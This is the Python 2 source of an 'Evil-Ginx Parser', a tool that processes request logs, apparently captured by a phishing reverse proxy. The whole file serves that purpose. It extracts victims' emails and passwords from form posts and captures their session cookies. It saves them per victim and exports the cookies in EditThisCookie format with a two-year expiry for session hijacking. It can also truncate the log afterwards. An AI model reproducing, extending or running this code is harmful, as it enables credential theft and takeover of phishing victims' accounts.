#!/usr/bin/python
"""Evil-Ginx Parser"""
import os
import os.path
import argparse
import json
import ConfigParser
import urllib
import time
import datetime

EOL = '\n'
TAB = '\t'

email_by_ips = {}

class log_data:
	def __init__(self, email, passwd, tokens):
		self.email = email
		self.passwd = passwd
		self.tokens = tokens

def get_post_args(data):
	"""returns post args as a dict"""
	ret = {}
	pargs = data.split('&')
	for parg in pargs:
		p = parg.split('=')
		if len(p) == 2:
			name = p[0]
			val = p[1]
			ret[name] = val
	return ret

def get_set_cookies(data):
	"""returns set-cookies headers as a dict"""
	ret = {}
	cargs = data.split('||')
	for ck in cargs:
		ie = ck.find('=')
		sn = ck.find(';')
		if ie > -1 and sn > -1:
			name = ck[:ie]
			val = ck[ie+1:sn]
			ret[name] = val
	return ret

def get_token_names(tokens_json):
	"""gets token names from credentials config"""
	ret = []
	tokens = json.loads(tokens_json)
	for tk in tokens:
		for ck in tk["cookies"]:
			ret.append(ck)
	return ret

def get_token_domains(tokens_json):
	"""gets tokens by domain"""
	ret = {}
	tokens = json.loads(tokens_json)
	for tk in tokens:
		for ck in tk["cookies"]:
			ret[ck] = tk["domain"]
	return ret

def tokens_ready(setcookies, tokens):
	"""check if all required tokens are present in set-cookies headers"""
	if setcookies == None or tokens == None:
		return False
	_tokens = tokens[:]
	for tk in setcookies:
		if tk in _tokens:
			_tokens.remove(tk)
	if len(_tokens) == 0:
		return True
	return False

def dump_tokens(setcookies, tokens, token_domains):
	"""dumps crednetial tokens to string compatible with EditThisCookie chrome extension"""
	ret = []
	for tk in tokens:
		name = tk
		val = setcookies[tk]
		domain = token_domains[tk]
		expire_time = int(time.time() + 2 * 365 * 24 * 60 * 60) # 2 years in the future
		ck = {}
		ck['domain'] = domain
		ck["expirationDate"] = expire_time
		ck['name'] = name
		ck['path'] = '/'
		ck['value'] = val
		ret.append(ck)
	return json.dumps(ret)

def create_log(outdir, logn, email, passwd, tokens):
	"""creates a log file"""
	if email == '':
		email = 'unknown'
	
	if not os.path.exists(outdir):
		os.mkdir(outdir)

	log_dir = os.path.join(outdir, email)
	t_str = datetime.datetime.utcfromtimestamp(time.time()).today().strftime('%Y%m%d_%H%M%S')
	
	if not os.path.exists(log_dir):
		os.mkdir(log_dir)

	# save creds
	if tokens != '':
		with open(os.path.join(log_dir, t_str + '_' + str(logn) + '_tokens.txt'), 'wt') as f:
			f.write('email:	 ' + email + EOL)
			f.write('passwd: ' + passwd + EOL + EOL)
			f.write(tokens + EOL)
			f.close()
	elif passwd != '':
		with open(os.path.join(log_dir, t_str + '_' + str(logn) + '_creds.txt'), 'wt') as f:
			f.write('email:	 ' + email + EOL)
			f.write('passwd: ' + passwd + EOL)
			f.close()

def load_creds_cfg(path):
	"""loads credentials config file"""
	cfg = ConfigParser.ConfigParser()
	cfg.read(path)

	if cfg.has_section('creds') and cfg.has_option('creds', 'email_arg') and cfg.has_option('creds', 'passwd_arg') and cfg.has_option('creds', 'tokens'):
		return cfg
	return None

def parse_line(cfg, cur_email, line):
	"""parse log line"""
	global email_by_ips

	req = json.loads(line)

	email_arg = cfg.get('creds', 'email_arg').strip()
	passwd_arg = cfg.get('creds', 'passwd_arg').strip()

	remote_addr = req['remote_addr']
	post_args = get_post_args(req['body'])
	tokens = get_token_names(cfg.get('creds', 'tokens'))
	token_domains = get_token_domains(cfg.get('creds', 'tokens'))
	set_cookies = get_set_cookies(req['set-cookies'])

	cur_email = ''
	cur_passwd = ''
	token_data = ''

	if email_arg and passwd_arg in post_args:
		cur_email = urllib.unquote(post_args[email_arg]).decode('utf8')
		cur_passwd = urllib.unquote(post_args[passwd_arg]).decode('utf8')
		email_by_ips[req['remote_addr']] = cur_email
	if req['remote_addr'] in email_by_ips and tokens_ready(set_cookies, tokens):
		token_data = dump_tokens(set_cookies, tokens, token_domains)

	return remote_addr, cur_email, cur_passwd, token_data

def parse_args():
	"""parse script aguments"""
	parser = argparse.ArgumentParser()
	parser.add_argument('-i', '--input', help='Input log file to parse.', default='', required=True)
	parser.add_argument('-o', '--outdir', help='Directory where output files will be saved.', default='', required=True)
	parser.add_argument('-c', '--creds', help='Credentials configuration file.', default='', required=True)
	parser.add_argument('-x', '--truncate', help='Truncate log file after parsing.', action='store_true')
	return parser.parse_args()

def main():
	"""main function"""
	args = parse_args()

	cfg = load_creds_cfg(args.creds)
	if cfg:
		cur_email = ''

		log_entries = {}
		clients = {}
		logn = 0
		ncreds = 0
		ntokens = 0
		with open(args.input, 'r+b') as f:
			lines = f.readlines()
			for line in lines:
				if len(line) > 0:
					remote_addr, email, passwd, tokens = parse_line(cfg, cur_email, line)
					if remote_addr != '' and ((email != '' and passwd != '') or tokens != ''):
						if email != '' and passwd != '':
							clients[remote_addr] = log_data(email, passwd, '')
							ncreds += 1
						if tokens != '':
							ntokens += 1
						if email == '' and remote_addr in clients:
							email = clients[remote_addr].email
							passwd = clients[remote_addr].passwd
						create_log(args.outdir, logn, email, passwd, tokens)
						logn += 1
			if args.truncate:
				f.truncate(0)
			f.close()

		print 'found creds:	 ' + str(ncreds)
		print 'found tokens: ' + str(ntokens)
	   
	else:
		print '[-] creds config corrupted.'

if __name__ == '__main__':
	main()
